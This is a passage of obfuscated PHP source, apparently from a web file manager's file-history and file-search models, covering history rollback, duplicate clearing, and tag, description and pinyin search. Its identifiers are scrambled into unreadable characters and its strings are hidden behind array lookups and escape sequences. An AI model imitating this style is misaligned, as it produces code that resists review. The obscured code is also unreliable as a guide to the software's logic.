|| !$è“Ì´ö¾) { return; } $º‹¨¦îì = array($¨²¿Ûê[505] => array($¨²¿Ûê[7], $²”õÎ«)); $this->where($º‹¨¦îì)->delete(); Model($¨²¿Ûê[557])->remove($è“Ì´ö¾); } public function listData($ÜÌü×˜®) { $Œƒ…Ë— =& $_SERVER[åÄ¼Ùßš]; $ÓÍÕ‹üª = array($Œƒ…Ë—[503] => $ÜÌü×˜®); $Ğ‰ˆ­áĞ = $Œƒ…Ë—[2283]; $æĞ € = $this->field($Ğ‰ˆ­áĞ)->where($ÓÍÕ‹üª)->order($Œƒ…Ë—[2275])->selectPage(); $this->_listAppendUser($æĞ €[$Œƒ…Ë—[447]]); $‹î¥÷Šî = Model($Œƒ…Ë—[866])->get($Œƒ…Ë—[1362]); $ÚÜÙ±©İ = 5; if ($‹î¥÷Šî == $Œƒ…Ë—[1363]) { $æĞ €[$Œƒ…Ë—[447]] = array_slice($æĞ €[$Œƒ…Ë—[447]], 0, $ÚÜÙ±©İ); $æĞ €[$Œƒ…Ë—[444]] = array($Œƒ…Ë—[2284] => 1, $Œƒ…Ë—[2285] => 20, $Œƒ…Ë—[2286] => 1, $Œƒ…Ë—[2287] => count($æĞ €[$Œƒ…Ë—[447]])); } return $æĞ €; } protected function _listAppendUser(&$ş –‡Ô‘) { $¤Â¯¾Ä÷ =& $_SERVER[åÄ¼Ùßš]; $İËôê€ = array_to_keyvalue($ş –‡Ô‘, $¤Â¯¾Ä÷[12], $¤Â¯¾Ä÷[1817]); $ö¶³Åş = Model($¤Â¯¾Ä÷[610])->userListInfo($İËôê€); foreach ($ş –‡Ô‘ as &$ß¥³šíù) { $²¤ó½«ù = $ß¥³šíù[$¤Â¯¾Ä÷[1817]]; $ß¥³šíù[$¤Â¯¾Ä÷[538]] = $ö¶³Åş[$²¤ó½«ù] ? $ö¶³Åş[$²¤ó½«ù] : !1; } unset($ß¥³šíù); } public function fileInfo($µŠáì›ª, $û¿½¼£ˆ = false) { $Ş¢Â¾Àı =& $_SERVER[åÄ¼Ùßš]; $›šÀÎõÂ = $this->tablePrefix; $Îã Ç‡¯ = "{$›šÀÎõÂ}\151\x6f\x5f\146\x69\x6c\145\x20\146\x69\x6c\145\x73\40\x6f\156\x20\x66\151\x6c\145\x73\56\x66\x69\154\x65\x49\104\40\75\x20\150\151\163\x74\x6f\162\171\x2e\146\x69\x6c\145\x49\104"; $‰É÷¡Ü = $this->alias($Ş¢Â¾Àı[2288])->where(array($Ş¢Â¾Àı[505] => $µŠáì›ª))->join($Îã Ç‡¯, $Ş¢Â¾Àı[2289])->find(); if ($‰É÷¡Ü && $û¿½¼£ˆ) { $’¸ìçè = array($Ş¢Â¾Àı[194] => $‰É÷¡Ü[$Ş¢Â¾Àı[194]], $Ş¢Â¾Àı[484] => array($Ş¢Â¾Àı[1121], $µŠáì›ª)); $‰É÷¡Ü[$Ş¢Â¾Àı[1703]] = $this->where($’¸ìçè)->count(); } return $‰É÷¡Ü; } public function removeItem($ï€å‚Ò) { $½”˜ÛšÖ =& $_SERVER[åÄ¼Ùßš]; $¨ä¢µ‡Â = array($½”˜ÛšÖ[505] => $ï€å‚Ò); $î¹§èÄè = $this->where($¨ä¢µ‡Â)->find(); if ($î¹§èÄè) { $Ç†ôÉ = $this->where($¨ä¢µ‡Â)->delete(); Model($½”˜ÛšÖ[557])->remove($î¹§èÄè[$½”˜ÛšÖ[554]]); return $Ç†ôÉ; } return !1; } public function removeBySource($Œƒğˆ…¼) { $©„àÇ¿ =& $_SERVER[åÄ¼Ùßš]; if (!$Œƒğˆ…¼) { return !1; } if (!is_array($Œƒğˆ…¼)) { $Œƒğˆ…¼ = array($Œƒğˆ…¼); } $óº€Ÿ«ˆ = array($©„àÇ¿[503] => array($©„àÇ¿[7], $Œƒğˆ…¼)); $ŒÊÙ©ê˜ = $this->field($©„àÇ¿[555])->where($óº€Ÿ«ˆ)->select(); if ($ŒÊÙ©ê˜) { $this->where($óº€Ÿ«ˆ)->delete(); $œÇ†Ñç½ = array_to_keyvalue($ŒÊÙ©ê˜, $©„àÇ¿[12], $©„àÇ¿[554]); Model($©„àÇ¿[557])->remove($œÇ†Ñç½); } return !0; } public function setDetail($Ÿö¤¤İŸ, $Çâ™ìƒ) { $•ëÆ©•ƒ =& $_SERVER[åÄ¼Ùßš]; return $this->where(array($•ëÆ©•ƒ[505] => $Ÿö¤¤İŸ))->save(array($•ëÆ©•ƒ[2279] => $Çâ™ìƒ)); } public function rollbackToItem($›¨ÂÅ´Ç, $‹¢ºÁ) { $Ğ”¥à›Â =& $_SERVER[åÄ¼Ùßš]; $Ì¬Œ‰áÉ = Model($Ğ”¥à›Â[926])->sourceInfo($›¨ÂÅ´Ç); $this->addHistory($Ì¬Œ‰áÉ, LNG($Ğ”¥à›Â[2290])); $ÁÉè©Õè = $this->find($‹¢ºÁ); $”£™¹Òµ = array($Ğ”¥à›Â[554] => $ÁÉè©Õè[$Ğ”¥à›Â[554]], $Ğ”¥à›Â[79] => $ÁÉè©Õè[$Ğ”¥à›Â[79]], $Ğ”¥à›Â[88] => time(), $Ğ”¥à›Â[540] => USER_ID); Model($Ğ”¥à›Â[926])->where(array($Ğ”¥à›Â[194] => $›¨ÂÅ´Ç))->save($”£™¹Òµ); return $this->where(array($Ğ”¥à›Â[505] => $‹¢ºÁ))->delete(); } public function clearSame($ÅÜğ¢â) { $¢§Ö”ü® =& $_SERVER[åÄ¼Ùßš]; $ ±ç÷¯Ã = $this->listData($ÅÜğ¢â); $µÖô² = array_to_keyvalue_group($ ±ç÷¯Ã, $¢§Ö”ü®[554]); $ÃıåÉ³ = array(); $’Öß°íü = array(); foreach ($µÖô² as $Ò…¨»‚Ö) { if (!$Ò…¨»‚Ö || count($Ò…¨»‚Ö) <= 1) { continue; } foreach ($Ò…¨»‚Ö as $¿‘†Ã¬¹) { $ÃıåÉ³[] = $¿‘†Ã¬¹[$¢§Ö”ü®[554]]; $’Öß°íü[] = $¿‘†Ã¬¹[$¢§Ö”ü®[484]]; } } if (!$’Öß°íü) { return; } $this->where(array($¢§Ö”ü®[484] => array($¢§Ö”ü®[7], $’Öß°íü)))->delete(); Model($¢§Ö”ü®[557])->remove($ÃıåÉ³); } public function userSpace() { $²Œ÷‰¥ =& $_SERVER[åÄ¼Ùßš]; $ï¬ùòÊ¹ = $this->tablePrefix; $£¿–Àê = array($²Œ÷‰¥[1808] => USER_ID); $ä²š’¨Â = "{$ï¬ùòÊ¹}\151\x6f\x5f\x66\151\154\x65\x20\x66\151\154\145\163\x20\x6f\x6e\x20\x66\151\154\x65\x73\x2e\146\151\x6c\x65\x49\x44\40\75\40\x68\151\x73\x74\x6f\162\x79\56\x66\151\154\145\111\x44"; return $this->alias($²Œ÷‰¥[2288])->where($£¿–Àê)->join($ä²š’¨Â, $²Œ÷‰¥[2289])->sum($²Œ÷‰¥[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($–áŸ·üË) { $úÃƒ§ =& $_SERVER[åÄ¼Ùßš]; $Ö­É·€¥ = KodIO::fileTypeList(); $Šîè“€× = $Ö­É·€¥[$–áŸ·üË]; if (!$Šîè“€×) { return array(); } $Ê‰Ü¥‰é = $Šîè“€×[$úÃƒ§[169]]; $…ÆÖöÈ = $úÃƒ§[7]; if (!$Šîè“€×[$úÃƒ§[169]]) { $¢è™ÕæÂ = array_to_keyvalue($Ö­É·€¥, $úÃƒ§[12], $úÃƒ§[169]); $Ê‰Ü¥‰é = implode($úÃƒ§[50], $¢è™ÕæÂ); $…ÆÖöÈ = $úÃƒ§[2291]; } $–•›½¥è = explode($úÃƒ§[50], trim($Ê‰Ü¥‰é, $úÃƒ§[50])); return array($…ÆÖöÈ, $–•›½¥è); } public function listPathType($—‘™ôô°) { $ø“¾¿”½ =& $_SERVER[åÄ¼Ùßš]; $Şìúç’ = $this->fileTypeWhere($—‘™ôô°); if (!$Şìúç’) { return array(); } $ÃÂÈËŠ = USER_ID; $ø¦½ÆûÌ = Model($ø“¾¿”½[610])->getInfo($ÃÂÈËŠ); $ª«ì”• = array($ø“¾¿”½[664] => SourceModel::TYPE_USER, $ø“¾¿”½[597] => array($ø“¾¿”½[628], $ø“¾¿”½[606] . $ø¦½ÆûÌ[$ø“¾¿”½[90]][$ø“¾¿”½[194]] . $ø“¾¿”½[629]), $ø“¾¿”½[665] => $ÃÂÈËŠ, $ø“¾¿”½[662] => 0, $ø“¾¿”½[663] => $Şìúç’); return $this->listSource($ª«ì”•); } public function listSearch($§ÄçŸñ, $õ’’‡ˆ‘ = 300) { $¼éôÎá =& $_SERVER[åÄ¼Ùßš]; if (isset($§ÄçŸñ[$¼éôÎá[2115]]) && $§ÄçŸñ[$¼éôÎá[2115]]) { $§ÄçŸñ[$¼éôÎá[2115]] = str_replace($¼éôÎá[472], $¼éôÎá[2292], trim($§ÄçŸñ[$¼éôÎá[2115]])); } $Ò´·Šº  = $this->_parseSearchWhere($§ÄçŸñ); if (!isset($Ò´·Šº [$¼éôÎá[517]])) { $Ò´·Šº [$¼éôÎá[517]] = 0; } $ç‘¶®ÂÊ = $¼éôÎá[2293]; $´¹ÍÈú = $Ò´·Šº ; $º“ÓóÎ = $ç‘¶®ÂÊ; $this->_listSearchBindPinyin($§ÄçŸñ, $Ò´·Šº , $ç‘¶®ÂÊ); $this->alias($¼éôÎá[530])->_makeOrder(); $Ò´·Šº  = $this->parseWhereLike($Ò´·Šº ); $ £Áòƒ = $this->distinct(!0)->field($ç‘¶®ÂÊ)->where($Ò´·Šº )->selectPage($õ’’‡ˆ‘); if ($GLOBALS[$¼éôÎá[6]][$¼éôÎá[469]][$¼éôÎá[470]] && Input::check($§ÄçŸñ[$¼éôÎá[2115]], $¼éôÎá[671]) && $ £Áòƒ[$¼éôÎá[444]][$¼éôÎá[430]] == 1 && $ £Áòƒ[$¼éôÎá[444]][$¼éôÎá[445]] == 0) { $ £Áòƒ = $this->distinct(!0)->field($ç‘¶®ÂÊ)->where($´¹ÍÈú)->limit(1000)->select(); $ £Áòƒ = array_page_split($ £Áòƒ, !1, $õ’’‡ˆ‘); } $this->_listSearchFileContent($ £Áòƒ, $§ÄçŸñ, $º“ÓóÎ, $´¹ÍÈú); $this->_listSearchDesc($ £Áòƒ, $§ÄçŸñ, $º“ÓóÎ); $this->_listSearchTag($ £Áòƒ, $§ÄçŸñ, $º“ÓóÎ); $this->_listSearchGroupTag($ £Áòƒ, $§ÄçŸñ, $º“ÓóÎ); $this->_listDataApply($ £Áòƒ[$¼éôÎá[447]]); $this->_listMake($ £Áòƒ); return $ £Áòƒ; } private function _listSearchFileContent(&$ï±¢ÒİÊ, $Î–ìì…ï, $ö‡ñº®, $Á”ÉÚç) { $÷Ì¶ì®« =& $_SERVER[åÄ¼Ùßš]; if (!$Î–ìì…ï[$÷Ì¶ì®«[2115]] || $ï±¢ÒİÊ[$÷Ì¶ì®«[444]][$÷Ì¶ì®«[430]] > 1) { return; } if (!isset($Á”ÉÚç[$÷Ì¶ì®«[32]]) || !is_array($Î–ìì…ï[$÷Ì¶ì®«[554]])) { return; } $Á”ÉÚç[$÷Ì¶ì®«[554]] = array($÷Ì¶ì®«[7], $Î–ìì…ï[$÷Ì¶ì®«[554]]); unset($Á”ÉÚç[$÷Ì¶ì®«[32]]); unset($Î–ìì…ï[$÷Ì¶ì®«[554]]); $½”á‰ÇÎ = $this->field($ö‡ñº®)->where($Á”ÉÚç)->limit($÷Ì¶ì®«[2294])->select(); if (!$½”á‰ÇÎ || count($½”á‰ÇÎ) == 0) { return; } $ï±¢ÒİÊ[$÷Ì¶ì®«[447]] = array_merge($½”á‰ÇÎ, $ï±¢ÒİÊ[$÷Ì¶ì®«[447]]); $ï±¢ÒİÊ[$÷Ì¶ì®«[444]][$÷Ì¶ì®«[445]] += count($½”á‰ÇÎ); } private function _listSearchTag(&$â¶Óë«, $¨™Çµõ£, $ê™²ÓàÊ) { $¼ˆ‰š¡ß =& $_SERVER[åÄ¼Ùßš]; if (empty($¨™Çµõ£[$¼ˆ‰š¡ß[1977]]) || !in_array($¼ˆ‰š¡ß[2295], $¨™Çµõ£[$¼ˆ‰š¡ß[1977]])) { return; } if (!$¨™Çµõ£[$¼ˆ‰š¡ß[2115]] || $â¶Óë«[$¼ˆ‰š¡ß[444]][$¼ˆ‰š¡ß[430]] > 1) { return; } $–öå¬•è = Model($¼ˆ‰š¡ß[2296])->listData(); $ˆìĞÚ©Ä = array(); $¶»ÑÇ— = $¨™Çµõ£[$¼ˆ‰š¡ß[2115]]; foreach ($–öå¬•è as $´ÔçêÙÚ) { $Á¢Óè = $´ÔçêÙÚ[$¼ˆ‰š¡ß[32]]; $åù«˜§ï = str_replace($¼ˆ‰š¡ß[53], $¼ˆ‰š¡ß[12], Pinyin::get($Á¢Óè)); if (stripos($Á¢Óè, $¶»ÑÇ—) !== !1 || stripos($åù«˜§ï, $¶»ÑÇ—) !== !1) { $ˆìĞÚ©Ä[] = $´ÔçêÙÚ[$¼ˆ‰š¡ß[484]]; } } if (!$ˆìĞÚ©Ä) { return; } $áÕÌ˜± = array($¼ˆ‰š¡ß[512] => array($¼ˆ‰š¡ß[7], $ˆìĞÚ©Ä), $¼ˆ‰š¡ß[1817] => USER_ID); $˜ƒ‡öé’ = Model($¼ˆ‰š¡ß[514])->field($¼ˆ‰š¡ß[87])->where($áÕÌ˜±)->select(); $˜ƒ‡öé’ = array_to_keyvalue($˜ƒ‡öé’, $¼ˆ‰š¡ß[12], $¼ˆ‰š¡ß[87]); $¢Ñ‘Ğò = array_unique($˜ƒ‡öé’); $this->_listSearchMerge($â¶Óë«, $¨™Çµõ£, $ê™²ÓàÊ, $¢Ñ‘Ğò); } private function _listSearchDesc(&$ÄµÏâ³, $¬ÉÀ¶, $ïƒ½´·Ç) { $İĞ­Ñ„ë =& $_SERVER[åÄ¼Ùßš]; if (empty($¬ÉÀ¶[$İĞ­Ñ„ë[1977]]) || !in_array($İĞ­Ñ„ë[537], $¬ÉÀ¶[$İĞ­Ñ„ë[1977]])) { return; } if (!$¬ÉÀ¶[$İĞ­Ñ„ë[2115]] || $ÄµÏâ³[$İĞ­Ñ„ë[444]][$İĞ­Ñ„ë[430]] > 1) { return; } $Ãí‡šŠ = array($İĞ­Ñ„ë[97] => $İĞ­Ñ„ë[537], $İĞ­Ñ„ë[452] => array($İĞ­Ñ„ë[471], $İĞ­Ñ„ë[2117] . $¬ÉÀ¶[$İĞ­Ñ„ë[2115]] . $İĞ­Ñ„ë[2117])); $Çˆº£¢ï = !1; if ($Çˆº£¢ï) { $å÷°›š´ = $this->listSearchChildren($¬ÉÀ¶[$İĞ­Ñ„ë[193]]); $å÷°›š´ = array_unique($å÷°›š´); if (!$å÷°›š´) { return; } $Ãí‡šŠ[$İĞ­Ñ„ë[194]] = array($İĞ­Ñ„ë[7], $å÷°›š´); } $ôÀ®°©á = Model($İĞ­Ñ„ë[648])->field($İĞ­Ñ„ë[194])->where($Ãí‡šŠ)->limit(5000)->select(); $Û˜¢„‹Œ = array_to_keyvalue($ôÀ®°©á, $İĞ­Ñ„ë[12], $İĞ­Ñ„ë[194]); $this->_listSearchMerge($ÄµÏâ³, $¬ÉÀ¶, $ïƒ½´·Ç, $Û˜¢„‹Œ); } private function _listSearchGroupTag(&$†«œ‚ª, $Ù¸ÄŞ, $Š’ø¢) { $´Äîş÷ =& $_SERVER[åÄ¼Ùßš]; if (empty($Ù¸ÄŞ[$´Äîş÷[1977]]) || !in_array($´Äîş÷[2295], $Ù¸ÄŞ[$´Äîş÷[1977]])) { return; } if (!$Ù¸ÄŞ[$´Äîş÷[2115]] || $†«œ‚ª[$´Äîş÷[444]][$´Äîş÷[430]] > 1 || !$Ù¸ÄŞ[$´Äîş÷[193]]) { return; } $©€„‰¢° = $this->sourceInfo($Ù¸ÄŞ[$´Äîş÷[193]]); if (!$©€„‰¢° || $©€„‰¢°[$´Äîş÷[191]] != SourceModel::TYPE_GROUP) { return; } $µêÉ•Áá = $©€„‰¢°[$´Äîş÷[582]]; $ß¾íËæÆ = Model($´Äîş÷[2297])->get($µêÉ•Áá); $œ…Á¤ = array(); $Ú–ê€ä = $Ù¸ÄŞ[$´Äîş÷[2115]]; foreach ($ß¾íËæÆ[$´Äîş÷[447]] as $°Øªä¸ñ) { $ÜïÕÖ²û = $°Øªä¸ñ[$´Äîş÷[32]]; $ˆ’ñ¥‡ = str_replace($´Äîş÷[53], $´Äîş÷[12], Pinyin::get($ÜïÕÖ²û)); if (stripos($ÜïÕÖ²û, $Ú–ê€ä) !== !1 || stripos($ˆ’ñ¥‡, $Ú–ê€ä) !== !1) { $œ…Á¤[] = $°Øªä¸ñ[$´Äîş÷[484]]; } } if (!$œ…Á¤) { return; } $À±Ö–®ˆ = array($´Äîş÷[512] => array($´Äîş÷[7], $œ…Á¤), $´Äîş÷[1817] => 0, $´Äîş÷[33] => $´Äîş÷[1424] . $µêÉ•Áá); $³î÷Òğ¥ = Model($´Äîş÷[514])->field($´Äîş÷[87])->where($À±Ö–®ˆ)->select(); $³î÷Òğ¥ = array_to_keyvalue($³î÷Òğ¥, $´Äîş÷[12], $´Äîş÷[87]); $àïâªÊ = array_unique($³î÷Òğ¥); $this->_listSearchMerge($†«œ‚ª, $Ù¸ÄŞ, $Š’ø¢, $àïâªÊ); } private function _listSearchMerge(&$’Š€ØÖ, $ï”ô®¨‰, $¼Ù³¾², $á“¨µÍø) { $®É¿°Ù =& $_SERVER[åÄ¼Ùßš]; if (!$á“¨µÍø) { return; } $Á¸ÆÕÆ = array_to_keyvalue($’Š€ØÖ[$®É¿°Ù[447]], $®É¿°Ù[12], $®É¿°Ù[194]); $¢éõÌğ = array_diff($á“¨µÍø, $Á¸ÆÕÆ); if (!$¢éõÌğ) { return; } $¼‹—¾›Ä = array($®É¿°Ù[194] => array($®É¿°Ù[7], $¢éõÌğ)); $ÈëÉÛ®ó = $this->field($¼Ù³¾²)->where($¼‹—¾›Ä)->select(); if (!$ÈëÉÛ®ó) { return; } $ÇøµëõÍ = array(); foreach ($ÈëÉÛ®ó as $“î’Ÿ©Î) { if ($this->_listSearchFilter($“î’Ÿ©Î, $ï”ô®¨‰)) { $ÇøµëõÍ[] = $“î’Ÿ©Î; } } $’Š€ØÖ[$®É¿°Ù[447]] = array_merge($ÇøµëõÍ, $’Š€ØÖ[$®É¿°Ù[447]]); $’Š€ØÖ[$®É¿°Ù[444]][$®É¿°Ù[445]] += count($ÇøµëõÍ); } private function _listSearchFilter($Úï›‡Õã, $¤À¬ÎÙñ) { $“¬ğ¬µ¤ =& $_SERVER[åÄ¼Ùßš]; $ˆÅ¶î– = $Úï›‡Õã[$“¬ğ¬µ¤[497]] == $“¬ğ¬µ¤[91]; if (!strstr($Úï›‡Õã[$“¬ğ¬µ¤[597]], $“¬ğ¬µ¤[50] . $¤À¬ÎÙñ[$“¬ğ¬µ¤[193]] . $“¬ğ¬µ¤[50])) { return !1; } if (isset($¤À¬ÎÙñ[$“¬ğ¬µ¤[498]]) && $¤À¬ÎÙñ[$“¬ğ¬µ¤[498]] != $“¬ğ¬µ¤[872]) { if ($¤À¬ÎÙñ[$“¬ğ¬µ¤[498]] == $“¬ğ¬µ¤[78] && !$ˆÅ¶î–) { return !1; } if ($¤À¬ÎÙñ[$“¬ğ¬µ¤[498]] != $“¬ğ¬µ¤[78] && $ˆÅ¶î–) { return !1; } if (!strstr($Úï›‡Õã[$“¬ğ¬µ¤[169]], $“¬ğ¬µ¤[50] . $¤À¬ÎÙñ[$“¬ğ¬µ¤[498]] . $“¬ğ¬µ¤[50])) { return !1; } } if (isset($¤À¬ÎÙñ[$“¬ğ¬µ¤[2298]]) && $¤À¬ÎÙñ[$“¬ğ¬µ¤[2298]] < $Úï›‡Õã[$“¬ğ¬µ¤[79]]) { return !1; } if (isset($¤À¬ÎÙñ[$“¬ğ¬µ¤[2299]]) && $¤À¬ÎÙñ[$“¬ğ¬µ¤[2299]] > $Úï›‡Õã[$“¬ğ¬µ¤[79]]) { return !1; } if (isset($¤À¬ÎÙñ[$“¬ğ¬µ¤[678]]) && $¤À¬ÎÙñ[$“¬ğ¬µ¤[678]] != $Úï›‡Õã[$“¬ğ¬µ¤[540]]) { return !1; } return !0; } public function listSearchChildren($‰ßÇıÀÑ, $ö‚”àå = 5000) { $ÏÉìôË± =& $_SERVER[åÄ¼Ùßš]; $÷Œ…³Ó = array(); $–¬‘Óâü = $this->sourceInfo($‰ßÇıÀÑ); $ŸªĞŒÇÒ = array($ÏÉìôË±[597] => array($ÏÉìôË±[471], $–¬‘Óâü[$ÏÉìôË±[597]] . $–¬‘Óâü[$ÏÉìôË±[194]] . $ÏÉìôË±[629])); $ñŞä×¾ = $this->field($ÏÉìôË±[79])->where($ŸªĞŒÇÒ)->limit($ö‚”àå + 1)->select(); $‡¢©¡Ñè = is_array($ñŞä×¾) ? count($ñŞä×¾) : 0; if ($‡¢©¡Ñè > $ö‚”àå) { return $this->_listSearchChildrenNear($‰ßÇıÀÑ, $ö‚”àå); } $ĞÈİ®¸¢ = $this->field($ÏÉìôË±[194])->where($ŸªĞŒÇÒ)->select(); $÷Œ…³Ó = array_to_keyvalue($ĞÈİ®¸¢, $ÏÉìôË±[12], $ÏÉìôË±[194]); return $÷Œ…³Ó; } private function _listSearchChildrenNear($”ªÄŞÎ , $Çº•÷æã) { $ÊìŞÓü =& $_SERVER[åÄ¼Ùßš]; $é»‹ñ§ğ = array(); $†ì—¸ˆ´ = array($ÊìŞÓü[193] => $”ªÄŞÎ ); $Ç’Ôı¹÷ = $this->field($ÊìŞÓü[2300])->where($†ì—¸ˆ´)->select(); $ è™¼Ï = array_to_keyvalue(array_filter_by_field($Ç’Ôı¹÷, $ÊìŞÓü[497], $ÊìŞÓü[91]), $ÊìŞÓü[12], $ÊìŞÓü[194]); $é»‹ñ§ğ = array_merge($é»‹ñ§ğ, array_to_keyvalue($Ç’Ôı¹÷, $ÊìŞÓü[12], $ÊìŞÓü[194])); if (!$ è™¼Ï) { return $é»‹ñ§ğ; } $†ì—¸ˆ´ = array($ÊìŞÓü[193] => array($ÊìŞÓü[7], $ è™¼Ï)); $Ç’Ôı¹÷ = $this->field($ÊìŞÓü[2300])->where($†ì—¸ˆ´)->limit($Çº•÷æã)->select(); $é»‹ñ§ğ = array_merge($é»‹ñ§ğ, array_to_keyvalue($Ç’Ôı¹÷, $ÊìŞÓü[12], $ÊìŞÓü[194])); $é»‹ñ§ğ = array_slice($é»‹ñ§ğ, 0, intval($Çº•÷æã)); return $é»‹ñ§ğ; } private function _listSearchBindPinyin($µŞ’ÉÓü, &$¦Ğòü·â, &$Şø‰èà¥) { $ã„¨‡’® =& $_SERVER[åÄ¼Ùßš]; if (!isset($µŞ’ÉÓü[$ã„¨‡’®[2115]]) || !$µŞ’ÉÓü[$ã„¨‡’®[2115]]) { return; } if (!Input::check($µŞ’ÉÓü[$ã„¨‡’®[2115]], $ã„¨‡’®[395]) || strlen($µŞ’ÉÓü[$ã„¨‡’®[2115]]) < 2) { return; } $¡ı–¶Æ = "\114\105\106\x54\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\151\157\137\x73\x6f\x75\x72\x63\145\x5f\x6d\145\x74\x61\x20\x6d\x65\x74\141\40\x6f\x6e\40\x73\157\x75\x72\x63\x65\56\163\x6f\165\x72\143\x65\111\x44\x20\x3d\x20\155\x65\x74\141\x2e\x73\x6f\165\162\x63\145\111\x44"; $ƒÕã©§Ü = array(); $Şø‰èà¥ = str_replace(array($ã„¨‡’®[288], $ã„¨‡’®[53], $ã„¨‡’®[2301]), $ã„¨‡’®[12], $Şø‰èà¥); $Şø‰èà¥ = $ã„¨‡’®[522] . str_replace($ã„¨‡’®[50], $ã„¨‡’®[523], $Şø‰èà¥); $ ´‚É”Ñ = $¦Ğòü·â[$ã„¨‡’®[32]]; unset($¦Ğòü·â[$ã„¨‡’®[32]]); foreach ($¦Ğòü·â as $Ä–®ğÀ => $â­ŸƒëÅ) { $ƒÕã©§Ü[$ã„¨‡’®[522] . $Ä–®ğÀ] = $â­ŸƒëÅ; } foreach ($ ´‚É”Ñ as $ş™¦çàø) { $ƒÕã©§Ü[] = array($ã„¨‡’®[527] => $ş™¦çàø, $ã„¨‡’®[1108] => $ã„¨‡’®[2119], array($ã„¨‡’®[2302] => $ş™¦çàø, $ã„¨‡’®[2303] => array($ã„¨‡’®[7], array($ã„¨‡’®[549], $ã„¨‡’®[548])))); } $this->join($¡ı–¶Æ); $¦Ğòü·â = $ƒÕã©§Ü; } private function _parseSearchWhere($¾×œ¾”·) { $¹ÑåÎ¹½ =& $_SERVER[åÄ¼Ùßš]; $ä¸¦Ùœá = array(); if (isset($¾×œ¾”·[$¹ÑåÎ¹½[854]]) && $¾×œ¾”·[$¹ÑåÎ¹½[854]]) { $ä¸¦Ùœá[$¹ÑåÎ¹½[88]] = array($¹ÑåÎ¹½[2304], $¾×œ¾”·[$¹ÑåÎ¹½[854]]); } if (isset($¾×œ¾”·[$¹ÑåÎ¹½[855]]) && $¾×œ¾”·[$¹ÑåÎ¹½[855]]) { $İºëÂ½¨ = array($¹ÑåÎ¹½[2305], $¾×œ¾”·[$¹ÑåÎ¹½[855]]); if ($ä¸¦Ùœá[$¹ÑåÎ¹½[88]]) { $ä¸¦Ùœá[$¹ÑåÎ¹½[88]] = array($ä¸¦Ùœá[$¹ÑåÎ¹½[88]], $İºëÂ½¨, $¹ÑåÎ¹½[2306]); } else { $ä¸¦Ùœá[$¹ÑåÎ¹½[88]] = $İºëÂ½¨; } } if (isset($¾×œ¾”·[$¹ÑåÎ¹½[2298]]) && $¾×œ¾”·[$¹ÑåÎ¹½[2298]] > 0) { $ä¸¦Ùœá[$¹ÑåÎ¹½[79]] = array($¹ÑåÎ¹½[2304], $¾×œ¾”·[$¹ÑåÎ¹½[2298]]); } if (isset($¾×œ¾”·[$¹ÑåÎ¹½[2299]]) && $¾×œ¾”·[$¹ÑåÎ¹½[2299]]) { $İºëÂ½¨ = array($¹ÑåÎ¹½[2305], $¾×œ¾”·[$¹ÑåÎ¹½[2299]]); if ($ä¸¦Ùœá[$¹ÑåÎ¹½[79]]) { $ä¸¦Ùœá[$¹ÑåÎ¹½[79]] = array($ä¸¦Ùœá[$¹ÑåÎ¹½[79]], $İºëÂ½¨, $¹ÑåÎ¹½[2306]); } else { $ä¸¦Ùœá[$¹ÑåÎ¹½[79]] = $İºëÂ½¨; } } if (isset($¾×œ¾”·[$¹ÑåÎ¹½[678]]) && $¾×œ¾”·[$¹ÑåÎ¹½[678]]) { $ä¸¦Ùœá[] = array($¹ÑåÎ¹½[540] => $¾×œ¾”·[$¹ÑåÎ¹½[678]], $¹ÑåÎ¹½[538] => $¾×œ¾”·[$¹ÑåÎ¹½[678]], $¹ÑåÎ¹½[1108] => $¹ÑåÎ¹½[2119]); } if (isset($¾×œ¾”·[$¹ÑåÎ¹½[498]]) && $¾×œ¾”·[$¹ÑåÎ¹½[498]]) { $§óê¼û¸ = $¾×œ¾”·[$¹ÑåÎ¹½[498]]; if ($§óê¼û¸ == $¹ÑåÎ¹½[78]) { $ä¸¦Ùœá[$¹ÑåÎ¹½[497]] = 1; } else { if ($§óê¼û¸ == $¹ÑåÎ¹½[2307]) { $ä¸¦Ùœá[$¹ÑåÎ¹½[497]] = 0; } else { if ($§óê¼û¸) { $§óê¼û¸ = is_array($§óê¼û¸) ? $§óê¼û¸ : explode($¹ÑåÎ¹½[50], $§óê¼û¸); $ä¸¦Ùœá[$¹ÑåÎ¹½[498]] = array($¹ÑåÎ¹½[504], $§óê¼û¸); $ä¸¦Ùœá[$¹ÑåÎ¹½[497]] = 0; } } } } $this->_parseSearchParent($¾×œ¾”·, $ä¸¦Ùœá); if (isset($¾×œ¾”·[$¹ÑåÎ¹½[2115]]) && trim($¾×œ¾”·[$¹ÑåÎ¹½[2115]])) { $ËÀ£îë¬ = trim($¾×œ¾”·[$¹ÑåÎ¹½[2115]]); $ÉÛî™ıó = explode($¹ÑåÎ¹½[53], $ËÀ£îë¬); if (strlen($ËÀ£îë¬) > 2 && (substr($ËÀ£îë¬, 0, 1) == $¹ÑåÎ¹½[121] && substr($ËÀ£îë¬, -1) == $¹ÑåÎ¹½[121]) || substr($ËÀ£îë¬, 0, 1) == $¹ÑåÎ¹½[58] && substr($ËÀ£îë¬, -1) == $¹ÑåÎ¹½[58]) { $ËÀ£îë¬ = substr($ËÀ£îë¬, 1, -1); $ÉÛî™ıó = array($ËÀ£îë¬); } $ä¸¦Ùœá[$¹ÑåÎ¹½[32]] = array(array($¹ÑåÎ¹½[628], $¹ÑåÎ¹½[2117] . $ËÀ£îë¬ . $¹ÑåÎ¹½[2117])); if (count($ÉÛî™ıó) > 1) { $ä¸¦Ùœá[$¹ÑåÎ¹½[32]] = array(); foreach ($ÉÛî™ıó as $ÙÙƒ½İ³) { if (!trim($ÙÙƒ½İ³)) { continue; } $ä¸¦Ùœá[$¹ÑåÎ¹½[32]][] = array($¹ÑåÎ¹½[628], $¹ÑåÎ¹½[2117] . trim($ÙÙƒ½İ³) . $¹ÑåÎ¹½[2117]); } } } return $ä¸¦Ùœá; } private function _parseSearchParent($ëÔÅ°¼Á, &$±Ÿ‘Øšë) { $‘ª›£æ =& $_SERVER[åÄ¼Ùßš]; if (!isset($ëÔÅ°¼Á[$‘ª›£æ[193]]) || !$ëÔÅ°¼Á[$‘ª›£æ[193]]) { return; } $’ú˜·ÙÕ = $this->pathInfo($ëÔÅ°¼Á[$‘ª›£æ[193]]); $õòÓïÙ– = $’ú˜·ÙÕ[$‘ª›£æ[193]] . $‘ª›£æ[12] === $‘ª›£æ[231]; $ô¼­‘Â› = 